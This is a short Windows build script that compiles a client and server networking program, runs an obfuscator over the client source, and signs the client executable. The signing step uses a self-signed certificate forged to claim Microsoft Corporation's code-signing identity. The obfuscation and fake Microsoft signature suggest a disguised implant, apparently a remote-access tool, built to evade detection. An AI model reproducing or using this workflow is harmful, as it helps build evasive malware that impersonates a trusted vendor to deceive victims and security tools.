rm OUTPUT/CLW_Windows.exe
rm OUTPUT/SVW_Windows.exe
rm SSL/*

windres -O coff -i "CL/Windows/VERSIONINFO.rc" -o "CL/Windows/VERSIONIFO.o"

gcc "SV\Windows\main.c" "CL/Windows/VERSIONIFO.o" -lws2_32 -lpsapi -o OUTPUT/SVW_Windows.exe
py.exe .\Obfuscate.py 
gcc "CL\Windows\GeneratedC_Obfuscated_source.c" "CL/Windows/VERSIONIFO.o" -lws2_32 -lpsapi -o OUTPUT/CLW_Windows.exe

openssl genrsa -out SSL/priv.key 2048
openssl req -key SSL/priv.key -new -out SSL/csr.csr -subj "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/CN=Microsoft Code Signing PCA"
openssl x509 -signkey SSL/priv.key -in SSL/csr.csr -req -days 365 -out SSL/cert.crt
openssl.exe pkcs12 -in SSL/cert.crt -inkey SSL/priv.key -export -out SSL/pfx.pfx -passout pass:

.\signtool.exe sign /d "Microsoft Corporation" /du "www.microsoft.com" /f "SSL/pfx.pfx" .\OUTPUT\CLW_Windows.exe